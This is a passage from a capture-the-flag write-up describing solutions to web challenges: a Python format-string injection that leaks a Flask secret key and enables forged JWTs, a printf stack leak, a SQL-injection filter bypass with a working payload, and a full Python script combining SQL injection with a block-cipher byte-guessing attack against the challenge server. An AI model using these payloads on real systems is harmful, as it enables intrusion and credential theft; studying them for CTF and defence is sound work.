    <span class="n">secret</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>  
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">user_info</span><span class="p">,</span><span class="n">secret</span><span class="p">,</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>  
    <span class="k">return</span> <span class="p">[</span><span class="n">token</span><span class="p">,</span><span class="n">secret</span><span class="p">]</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">api</span><span class="p">():</span>  
    <span class="n">session</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s1">&#39;uuid&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()))</span>  
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>  
    <span class="n">command</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>  
    <span class="c1"># take everything before the first space and lowercase it  </span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>  

    <span class="k">if</span> <span class="n">prefix</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">command_responses</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid Command&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">400</span><span class="p">})</span>  
    <span class="n">response</span> <span class="o">=</span> <span class="n">generate_response</span><span class="p">(</span><span class="n">command_responses</span><span class="p">[</span><span class="n">prefix</span><span class="p">],</span> <span class="n">command</span><span class="p">)</span>  

    <span class="n">jwt_token</span><span class="p">,</span> <span class="n">secret</span> <span class="o">=</span> <span class="n">generate_jwt_token</span><span class="p">()</span>  
    <span class="n">save_token</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">],</span> <span class="n">secret</span><span class="p">)</span>  

    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="n">response</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">200</span><span class="p">}))</span>  
    <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="n">jwt_token</span><span class="p">)</span>  
    <span class="k">return</span> <span class="n">response</span>
</code></pre></div>
From this code, it should be noted that each user has their jwt token signed with an individual secret that is not shared. The <code>generate_response()</code> function is also rather suspicious
<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">RandomResponse</span><span class="p">:</span>  
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>  
        <span class="bp">self</span><span class="o">.</span><span class="n">response</span> <span class="o">=</span> <span class="n">response</span>  
        <span class="bp">self</span><span class="o">.</span><span class="n">reroll</span><span class="p">()</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">reroll</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
        <span class="n">rand_gen</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>  
        <span class="bp">self</span><span class="o">.</span><span class="n">generated</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">response</span><span class="o">*</span><span class="n">rand_gen</span>  

<span class="k">def</span><span class="w"> </span><span class="nf">generate_response</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>  
    <span class="n">responseObj</span> <span class="o">=</span> <span class="n">RandomResponse</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>  
    <span class="n">message</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{response.generated}</span><span class="s2"> but &quot;</span><span class="o">+</span><span class="n">command</span><span class="o">+</span><span class="s2">&quot;.&quot;</span>  
    <span class="k">return</span> <span class="n">message</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">response</span> <span class="o">=</span> <span class="n">responseObj</span><span class="p">)</span>
</code></pre></div>
For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the <code>message.format</code> function seems to be able to access attributes of <code>RandomResponse</code>, as from <code>{response.generated}</code>. Googling, I found this interesting post on reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this
<img alt="Pasted image 20241202223217.png" src="../../assets/Pasted%20image%2020241202223217.png" />
Using that, we are able to extract the flask secret key.
<img alt="Pasted image 20241202215754.png" src="../../assets/Pasted%20image%2020241202215754.png" />
Using the key, we are able to forge our own session tokens, controlling <code>uuid</code>. What can we do with a custom uuid? Remember that our goal is to be able to modify the jwt token to give ourselves admin, so we need a way to sign our own jwt tokens. If we revisit <code>get_secret()</code>, one line stands out.
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">get_secret</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;secrets.db&#39;</span><span class="p">)</span>  
    <span class="n">db</span><span class="o">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">cursor</span><span class="p">,</span> <span class="n">row</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT secret FROM secrets WHERE uuid = ?&quot;</span>  
    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">uuid</span><span class="p">,))</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">())</span> <span class="c1"># &lt;--</span>
    <span class="o">...</span>
</code></pre></div>
Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned <code>None</code> would be cast into a string <code>"None"</code>, thus returning the secret as <code>"None"</code>. By forging a session  token with a non-existent uuid, we are able to sign jwt tokens with <code>"None"</code>.
<img alt="Pasted image 20241202215911.png" src="../../assets/Pasted%20image%2020241202215911.png" />
The final step is to access <code>/admin</code>, giving us the flag
<img alt="Pasted image 20241202220039.png" src="../../assets/Pasted%20image%2020241202220039.png" />
<code>YBN24{8@ba_!S_A_B@d_PRo6rAmm3R}</code></p>
<blockquote>
<p>It should be mentioned a team managed to find a way to gain an invalid uuid without leaking the flask secret. After the session uuid is set and before the secret is saved, there is a check to ensure the command prefix is valid. If the prefix was invalid, only the uuid is saved and the function returns, hence generating an "invalid" uuid.
<img alt="Pasted image 20241202233419.png" src="../../assets/Pasted%20image%2020241202233419.png" />
You can also leak the flag from the format string itself
<div class="highlight"><pre><span></span><code>{response.init.globals[os].environ[FLAG]}
</code></pre></div></p>
</blockquote>
<h2 id="needle-in-a-haystack">Needle in a haystack<a class="headerlink" href="#needle-in-a-haystack" title="Permanent link">&para;</a></h2>
<p>TODO. This is more for personal use. Using <code>printf()</code> with user supplied input is dangerous as it allows memory in the stack to be leaked. We use <code>%&lt;n&gt;$s</code> here to brute force leaking the flag from the stack, where n is some number. I have yet to figure out how <code>printf()</code> calculates its offsets/addresses to read from based on the number we supply and the potential data types of varying arguments before the nth one. 
<code>YBN24{FL4G_1N_4_ST4CK_XDDDDDD}</code></p>
<h1 id="post-ctf-lessons">Post ctf lessons<a class="headerlink" href="#post-ctf-lessons" title="Permanent link">&para;</a></h1>
<h2 id="essay-evaluator">Essay evaluator<a class="headerlink" href="#essay-evaluator" title="Permanent link">&para;</a></h2>
<p>Usage of <code>...</code>  is a valid python object.
https://stackoverflow.com/questions/772124/what-does-the-ellipsis-object-do</p>
<h2 id="rentahitman-1">RentAHitman 1<a class="headerlink" href="#rentahitman-1" title="Permanent link">&para;</a></h2>
<p>Always consider the full scope of a potential vulnerability you are targeting. In this case, I was too focused on trying not to trip the blacklist detection.
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">detect_sqli</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>  
    <span class="c1"># List of common SQL keywords and characters often used in SQL injection  </span>
    <span class="c1"># TODO There are sqlite specific keywords such as ATTACH  </span>
    <span class="n">disallowed_patterns</span> <span class="o">=</span> <span class="p">[</span>  
        <span class="sa">r</span><span class="s2">&quot;SELECT&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;UNION&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;JOIN&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;FROM&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;WHERE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;ON&quot;</span><span class="p">,</span>  
        <span class="sa">r</span><span class="s2">&quot;OR&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;AND&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;NOT&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;IN&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;LIKE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;DROP&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;INSERT&quot;</span><span class="p">,</span>  
        <span class="sa">r</span><span class="s2">&quot;DELETE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;UPDATE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;EXEC&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;EXECUTE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;CREATE&quot;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&quot;ALTER&quot;</span><span class="p">,</span>  
        <span class="s2">&quot;--&quot;</span><span class="p">,</span> <span class="s2">&quot;#&quot;</span><span class="p">,</span> <span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="s2">&quot;/*&quot;</span><span class="p">,</span> <span class="s2">&quot;*/&quot;</span><span class="p">,</span> <span class="s2">&quot;@@&quot;</span><span class="p">,</span> <span class="s2">&quot;0x&quot;</span><span class="p">,</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;*&quot;</span>  
    <span class="p">]</span>  
    <span class="c1"># https://gist.github.com/cyberheartmi9/b4a4ff0f691be6b5c866450563258e86  </span>
    <span class="c1"># TODO OR and AND can be bypassed with || and &amp;&amp;  </span>

    <span class="c1"># Escape special characters and combine patterns into a single regex  </span>
    <span class="n">escaped_patterns</span> <span class="o">=</span> <span class="p">[</span><span class="n">re</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">pattern</span><span class="o">.</span><span class="n">isalnum</span><span class="p">()</span> <span class="k">else</span> <span class="n">pattern</span> <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">disallowed_patterns</span><span class="p">]</span>  
    <span class="n">combined_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">escaped_patterns</span><span class="p">),</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>  

    <span class="c1"># Check if any disallowed pattern is found in the SQL query  </span>
    <span class="k">if</span> <span class="n">combined_pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>  
        <span class="k">return</span> <span class="kc">True</span>  

    <span class="k">return</span> <span class="kc">False</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/filter&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;POST&quot;</span><span class="p">])</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">filter</span><span class="p">():</span>  
    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;is_logged_in&#39;</span><span class="p">):</span>  
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>  
    <span class="k">with</span> <span class="n">connect</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">uuid</span><span class="p">)</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>  
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Mimetype is </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">mimetype_params</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  
        <span class="n">search</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;search&#39;</span><span class="p">]</span>  
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Search term is </span><span class="se">\n</span><span class="si">{</span><span class="n">search</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  
        <span class="c1"># Split the terms and remove any containing blacklisted terms  </span>
        <span class="n">terms</span> <span class="o">=</span> <span class="n">search</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span>  
        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT name,location,description from targets&quot;</span>  
        <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">terms</span><span class="p">:</span>  
            <span class="k">if</span> <span class="n">detect_sqli</span><span class="p">(</span><span class="n">term</span><span class="p">):</span>  
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Removing blacklisted term </span><span class="si">{</span><span class="n">term</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  
                <span class="n">terms</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">term</span><span class="p">)</span>  
        <span class="k">if</span> <span class="n">terms</span><span class="p">:</span>  
            <span class="n">location_match</span> <span class="o">=</span> <span class="s2">&quot; OR &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;name LIKE &#39;%</span><span class="si">{</span><span class="n">term</span><span class="si">}</span><span class="s2">%&#39;&quot;</span> <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">terms</span><span class="p">)</span>  
            <span class="n">name_match</span> <span class="o">=</span> <span class="s2">&quot; OR &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;location LIKE &#39;%</span><span class="si">{</span><span class="n">term</span><span class="si">}</span><span class="s2">%&#39;&quot;</span> <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">terms</span><span class="p">)</span>  
            <span class="n">description_match</span> <span class="o">=</span> <span class="s2">&quot; OR &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;description LIKE &#39;%</span><span class="si">{</span><span class="n">term</span><span class="si">}</span><span class="s2">%&#39;&quot;</span> <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">terms</span><span class="p">)</span>  
            <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; WHERE &quot;</span> <span class="o">+</span> <span class="s2">&quot; OR &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">location_match</span><span class="p">,</span><span class="n">name_match</span><span class="p">,</span><span class="n">description_match</span><span class="p">])</span>  
            <span class="nb">print</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>  
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>  
        <span class="n">targets</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>  
        <span class="n">targets</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span>  
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span>
</code></pre></div>
However, preventing SQLI in this code consists of not only <em>detection</em>, but also <em>removal</em> of the terms. The terms are split by spaces into a list, then a for loop iterates and removes each term if SQLI is detected. The issue lies in the loop
<div class="highlight"><pre><span></span><code>        <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">terms</span><span class="p">:</span>  
            <span class="k">if</span> <span class="n">detect_sqli</span><span class="p">(</span><span class="n">term</span><span class="p">):</span>  
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Removing blacklisted term </span><span class="si">{</span><span class="n">term</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  
                <span class="n">terms</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">term</span><span class="p">)</span>  
</code></pre></div>
If an item is removed during iteration, the loop will skip over the next item and no detection or removal of the item happens. https://stackoverflow.com/a/1207427.
Hence, a query like <code>Next_term_is_skipped_SELECT %'/*You_are_free_to_execute_sql_here*/SELECT/**/BLAHBLAH.../**/;--</code> will allow for SQLI. 
(Comments are used to bypass spaces and prevent query from being split)</p>
<blockquote>
<p><img alt="Pasted image 20241204114515.png" src="../../assets/Pasted%20image%2020241204114515.png" /></p>
</blockquote>
<p>Interestingly, chatgpt would have also pointed out the solution if you chatgpt'd hard enough
https://chatgpt.com/share/674fd0a1-2870-800e-a95d-b7a7bc4bdc3e (Issue not mentioned)
https://chatgpt.com/share/674fd0b0-6dec-800e-a95f-92c880c7ef2d (Issue mentioned)</p>
<h2 id="rentahitman-2">RentAHitman 2<a class="headerlink" href="#rentahitman-2" title="Permanent link">&para;</a></h2>
<p>https://en.wikipedia.org/wiki/Padding_oracle_attack
"To my knowledge, Since AES-CBC block cipher is being used with a constant IV and a constant SALT, we are able to use an algorithm to guess each character one by one."
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.number</span><span class="w"> </span><span class="kn">import</span> <span class="n">bytes_to_long</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
<span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&quot;https://rentahitman-com-1-rentahitman-chall.ybn.sg&quot;</span> <span class="c1">#TODO</span>

<span class="c1"># range for possible flag chars</span>
<span class="n">ascii_start</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">ascii_end</span> <span class="o">=</span> <span class="mi">126</span>

<span class="n">block_byte_start</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">block_byte_end</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">block_byte_size</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">pw</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<span class="n">payload_length</span> <span class="o">=</span> <span class="n">block_byte_end</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">pw</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
<span class="n">starting_bytes</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="n">payload_length</span>
<span class="n">uuid</span> <span class="o">=</span> <span class="s2">&quot;075dccc5-3b76-4a15-9306-e943c676132b&quot;</span>
<span class="n">session</span> <span class="o">=</span> <span class="s2">&quot;eyJpc19sb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjN9.Z0n1ng.40KJnmVn8-Gur4fZ-4nCKLQEJCI&quot;</span>
<span class="n">GCLB</span> <span class="o">=</span> <span class="s2">&quot;CKDj2fyUjcrZ5AEQAw&quot;</span>
<span class="n">UserAgent</span> <span class="o">=</span> <span class="s2">&quot;YesButNo/1.0&quot;</span>
<span class="c1"># attack until get last byte, b&quot;}&quot;, attacks for more than 16 bytes</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_encrypted_pw</span><span class="p">(</span><span class="n">pw</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE_URL</span><span class="o">+</span><span class="s2">&quot;/signup&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">pw</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">pw</span><span class="p">},</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;uuid&quot;</span><span class="p">:</span><span class="n">uuid</span><span class="p">,</span><span class="s2">&quot;session&quot;</span><span class="p">:</span><span class="n">session</span><span class="p">,</span><span class="s2">&quot;GCLB&quot;</span><span class="p">:</span><span class="n">GCLB</span><span class="p">},</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span><span class="n">UserAgent</span><span class="p">})</span>
    <span class="n">sqli</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;-- dhadhlsjldas%&#39;/**/UNION/**/SELECT/**/username,password,userId/**/FROM/**/users/**/WHERE/**/username=&#39;</span><span class="si">{</span><span class="n">pw</span><span class="si">}</span><span class="s2">&#39;--&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE_URL</span><span class="o">+</span><span class="s2">&quot;/filter&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">sqli</span><span class="p">},</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;uuid&quot;</span><span class="p">:</span><span class="n">uuid</span><span class="p">,</span><span class="s2">&quot;session&quot;</span><span class="p">:</span><span class="n">session</span><span class="p">,</span><span class="s2">&quot;GCLB&quot;</span><span class="p">:</span><span class="n">GCLB</span><span class="p">},</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span><span class="n">UserAgent</span><span class="p">})</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">pw</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">pw</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="c1"># payload = hex(bytes_to_long(starting_bytes))[2:]</span>
    <span class="n">actual_leak</span> <span class="o">=</span> <span class="n">get_encrypted_pw</span><span class="p">(</span><span class="n">starting_bytes</span><span class="p">)</span>

    <span class="c1"># Starting payload for block attack</span>
    <span class="n">part_payload</span> <span class="o">=</span> <span class="n">starting_bytes</span> <span class="o">+</span> <span class="n">pw</span>

    <span class="c1"># running through all possible printable chars</span>
    <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
    <span class="k">for</span> <span class="n">ascii</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="n">char</span> <span class="o">=</span> <span class="n">ascii</span>
        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot; &quot;</span><span class="p">]:</span>
            <span class="k">continue</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">part_payload</span> <span class="o">+</span> <span class="n">char</span>
        <span class="n">test_leak</span> <span class="o">=</span> <span class="n">get_encrypted_pw</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

        <span class="c1"># checking if the actual leak&#39;s block and test_leak&#39;s first block match</span>
        <span class="k">if</span> <span class="n">test_leak</span><span class="p">[</span><span class="n">block_byte_start</span><span class="p">:</span><span class="n">block_byte_end</span><span class="p">]</span> <span class="o">==</span> <span class="n">actual_leak</span><span class="p">[</span><span class="n">block_byte_start</span><span class="p">:</span><span class="n">block_byte_end</span><span class="p">]:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">pw</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
            <span class="c1"># going into next block already</span>
            <span class="k">if</span> <span class="n">payload_length</span> <span class="o">%</span> <span class="n">block_byte_size</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">payload_length</span> <span class="o">+=</span> <span class="n">block_byte_size</span> <span class="o">-</span> <span class="mi">1</span>
                <span class="n">block_byte_start</span> <span class="o">+=</span> <span class="n">block_byte_size</span>
                <span class="n">block_byte_end</span> <span class="o">+=</span> <span class="n">block_byte_size</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">payload_length</span> <span class="o">-=</span> <span class="mi">1</span>

            <span class="n">starting_bytes</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="n">payload_length</span>
            <span class="n">part_payload</span> <span class="o">=</span> <span class="n">starting_bytes</span> <span class="o">+</span> <span class="n">pw</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
        <span class="k">break</span>
<span class="nb">print</span><span class="p">(</span><span class="n">pw</span><span class="p">)</span>
</code></pre></div>
Sol by Baba is dead</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
